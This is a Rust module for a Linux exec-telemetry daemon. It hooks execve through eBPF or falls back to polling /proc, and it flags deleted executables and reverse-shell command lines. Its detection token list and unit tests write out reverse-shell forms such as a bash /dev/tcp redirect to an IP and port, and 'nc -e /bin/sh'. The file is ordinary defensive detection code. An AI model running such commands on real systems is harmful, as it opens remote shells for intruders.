//! eBPF-backed execve interception with a CAP_BPF-free fallback.
//!
//! When compiled with the `ebpf` feature, exec events are captured in-kernel
//! by a BPF program attached to the `syscalls:sys_enter_execve` tracepoint and
//! drained from a BPF ring buffer (see [`crate::ebpf::aya_impl`] and
//! [`BPF_PROG_SRC`]). When the feature is off — or the kernel refuses to load
//! the program — a [`proc_scan::ProcExecScanner`] polls `/proc` and synthesizes
//! exec events for newly-observed pids, so the daemon always produces exec
//! telemetry.
//!
//! Events carry anomaly heuristics: an executable that resolves to `foo
//! (deleted)` is flagged `unlinked`; argv/cmdline containing well-known
//! reverse-shell tokens is flagged `reverse_shell`.

use std::sync::mpsc;

/// The embedded C eBPF source. Not compiled by cargo; see the header comment
/// in the file for the out-of-band `clang` invocation that produces the object
/// the aya loader consumes.
pub const BPF_PROG_SRC: &str = include_str!("bpf_prog.c");

/// CAP_BPF-free `/proc` snapshot scanner.
#[cfg(target_os = "linux")]
mod proc_scan;

/// Aya runtime hook (only compiled with the `ebpf` feature).
#[cfg(feature = "ebpf")]
mod aya_impl;

/// A single process execution event, normalized for IPC/JSON-lines output.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ExecEvent {
    pub pid: i32,
    pub ppid: i32,
    pub comm: String,
    pub exe: String,
    pub argv: Vec<String>,
    pub user: String,
    pub uid: u32,
    /// Process start time in nanoseconds since boot (`/proc/<pid>/stat` field
    /// 22, converted). `0` when the eBPF path is active (not part of the
    /// ring-buffer record).
    pub start_ns: u64,
    pub anomaly: bool,
    pub anomaly_type: String,
    pub detail: String,
    pub node: String,
}

/// Classify an exec event as anomalous. Returns `(anomaly, anomaly_type,
/// detail)`.
pub fn classify(exe: &str, argv: &[String]) -> (bool, String, String) {
    if exe.ends_with(" (deleted)") {
        return (
            true,
            "unlinked".into(),
            "executable backing file was deleted while the process ran".into(),
        );
    }
    const REVERSE_SHELL_TOKENS: &[&str] = &[
        "bash -i",
        "/dev/tcp/",
        "nc -e",
        "sh -i",
        "python -c",
        "socat",
    ];
    let joined = argv.join(" ");
    for tok in REVERSE_SHELL_TOKENS {
        if joined.contains(tok) || exe.contains(tok) {
            return (
                true,
                "reverse_shell".into(),
                format!("argv/cmdline matched reverse-shell token '{tok}'"),
            );
        }
    }
    (false, String::new(), String::new())
}

/// Apply the optional watch lists. Empty lists mean "match everything".
#[cfg(any(feature = "ebpf", target_os = "linux"))]
fn passes_filters(ev: &ExecEvent, watch_users: &[String], watch_comm: &[String]) -> bool {
    if !watch_users.is_empty() && !watch_users.iter().any(|u| *u == ev.user) {
        return false;
    }
    if !watch_comm.is_empty() && !watch_comm.iter().any(|c| *c == ev.comm) {
        return false;
    }
    true
}

/// Best-effort uid -> login-name lookup; falls back to the numeric uid.
/// Only referenced from the Linux-only code paths (proc fallback / aya hook),
/// so it is allowed to be unused on other targets.
#[cfg(unix)]
#[allow(dead_code)]
fn uid_to_user(uid: u32) -> String {
    unsafe {
        let mut buf = [0i8; 256];
        let mut pwd: libc::passwd = std::mem::zeroed();
        let mut result: *mut libc::passwd = std::ptr::null_mut();
        let rc = libc::getpwuid_r(uid, &mut pwd, buf.as_mut_ptr(), buf.len(), &mut result);
        if rc == 0 && !result.is_null() && !pwd.pw_name.is_null() {
            return std::ffi::CStr::from_ptr(pwd.pw_name)
                .to_string_lossy()
                .into_owned();
        }
    }
    uid.to_string()
}

#[cfg(not(unix))]
fn uid_to_user(uid: u32) -> String {
    uid.to_string()
}

/// Spawn the exec telemetry streamer.
///
/// Returns a `(control_tx, event_rx)` pair. `control_tx` accepts `false` to
/// pause event emission and `true` to resume it. The streamer uses the aya
/// in-kernel hook when the `ebpf` feature is compiled in and load/attach
/// succeeds; otherwise it transparently falls back to the `/proc` poller.
pub fn spawn_exec_streamer(
    node: &str,
    watch_users: &[String],
    watch_comm: &[String],
    enabled: bool,
) -> (mpsc::Sender<bool>, mpsc::Receiver<ExecEvent>) {
    spawn_exec_streamer_with_elf(node, watch_users, watch_comm, enabled, None)
}

/// Like [`spawn_exec_streamer`], but with an explicit eBPF object path
/// (`None`/empty uses the default locator paths in `aya_impl`).
pub fn spawn_exec_streamer_with_elf(
    node: &str,
    watch_users: &[String],
    watch_comm: &[String],
    enabled: bool,
    elf_path: Option<String>,
) -> (mpsc::Sender<bool>, mpsc::Receiver<ExecEvent>) {
    let (control_tx, control_rx) = mpsc::channel::<bool>();
    let (event_tx, event_rx) = mpsc::channel::<ExecEvent>();

    let node = node.to_string();
    let watch_users = watch_users.to_vec();
    let watch_comm = watch_comm.to_vec();

    let _ = std::thread::Builder::new()
        .name("exec-streamer".into())
        .spawn(move || {
            run_streamer(
                &node,
                &watch_users,
                &watch_comm,
                elf_path,
                control_rx,
                event_tx,
                enabled,
            );
        });

    (control_tx, event_rx)
}

#[cfg(not(feature = "ebpf"))]
fn run_streamer(
    node: &str,
    watch_users: &[String],
    watch_comm: &[String],
    _elf_path: Option<String>,
    control_rx: mpsc::Receiver<bool>,
    event_tx: mpsc::Sender<ExecEvent>,
    enabled: bool,
) {
    #[cfg(target_os = "linux")]
    {
        run_proc_fallback(node, watch_users, watch_comm, control_rx, event_tx, enabled);
    }
    #[cfg(not(target_os = "linux"))]
    {
        // No /proc and no aya: drain the control channel until the sender is
        // dropped so the streamer thread exits cleanly.
        while control_rx.recv().is_ok() {}
    }
}

#[cfg(feature = "ebpf")]
fn run_streamer(
    node: &str,
    watch_users: &[String],
    watch_comm: &[String],
    elf_path: Option<String>,
    control_rx: mpsc::Receiver<bool>,
    event_tx: mpsc::Sender<ExecEvent>,
    enabled: bool,
) {
    match crate::ebpf::aya_impl::start(elf_path.as_deref(), node) {
        Ok(src) => {
            log::info!("eBPF execve interceptor attached to sys_enter_execve");
            pump(src, control_rx, event_tx, watch_users, watch_comm, enabled);
        }
        Err(e) => {
            log::warn!(
                "eBPF execve interceptor unavailable ({e}); using /proc fallback"
            );
            #[cfg(target_os = "linux")]
            {
                run_proc_fallback(
                    node,
                    watch_users,
                    watch_comm,
                    control_rx,
                    event_tx,
                    enabled,
                );
            }
            #[cfg(not(target_os = "linux"))]
            {
                while control_rx.recv().is_ok() {}
            }
        }
    }
}

/// Bridge a source exec channel through control messages and the watch lists.
#[cfg(feature = "ebpf")]
fn pump(
    src: mpsc::Receiver<ExecEvent>,
    control_rx: mpsc::Receiver<bool>,
    event_tx: mpsc::Sender<ExecEvent>,
    watch_users: &[String],
    watch_comm: &[String],
    mut enabled: bool,
) {
    while let Ok(ev) = src.recv() {
        while let Ok(cmd) = control_rx.try_recv() {
            enabled = cmd;
        }
        if enabled && passes_filters(&ev, watch_users, watch_comm) {
            if event_tx.send(ev).is_err() {
                return;
            }
        }
    }
}

/// `/proc` polling fallback: emit synthetic exec events for newly observed
/// pids (and pid-reuses, detected via starttime changes).
#[cfg(target_os = "linux")]
fn run_proc_fallback(
    node: &str,
    watch_users: &[String],
    watch_comm: &[String],
    control_rx: mpsc::Receiver<bool>,
    event_tx: mpsc::Sender<ExecEvent>,
    mut enabled: bool,
) {
    let mut scanner =
        proc_scan::ProcExecScanner::new(node, watch_users.to_vec(), watch_comm.to_vec());
    loop {
        while let Ok(cmd) = control_rx.try_recv() {
            enabled = cmd;
        }
        if enabled {
            for ev in scanner.poll() {
                if event_tx.send(ev).is_err() {
                    return;
                }
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(250));
    }
}

#[cfg(test)]
mod tests {
    use super::classify;

    #[test]
    fn benign_exec_is_not_anomalous() {
        let (anomaly, kind, detail) = classify("/usr/bin/ls", &[]);
        assert!(!anomaly);
        assert!(kind.is_empty());
        assert!(detail.is_empty());
    }

    #[test]
    fn deleted_backing_file_is_unlinked() {
        let (anomaly, kind, _) = classify("/tmp/malware (deleted)", &[]);
        assert!(anomaly);
        assert_eq!(kind, "unlinked");
    }

    #[test]
    fn reverse_shell_argv_token() {
        let (anomaly, kind, _) = classify(
            "/bin/bash",
            &["bash".into(), "-i".into(), ">&/dev/tcp/1.2.3.4/4444".into()],
        );
        assert!(anomaly);
        assert_eq!(kind, "reverse_shell");
    }

    #[test]
    fn reverse_shell_netcat_token() {
        let (anomaly, kind, _) = classify("/usr/bin/nc", &["nc".into(), "-e".into(), "/bin/sh".into()]);
        assert!(anomaly);
        assert_eq!(kind, "reverse_shell");
    }

    #[test]
    fn token_in_exe_name_alone_flags() {
        let (anomaly, kind, _) = classify("/usr/bin/socat", &[]);
        assert!(anomaly);
        assert_eq!(kind, "reverse_shell");
    }

    #[test]
    fn benign_argv_does_not_false_positive() {
        let (anomaly, _, _) = classify(
            "/usr/bin/python3",
            &["python3".into(), "server.py".into(), "--port=8080".into()],
        );
        assert!(!anomaly);
    }
}
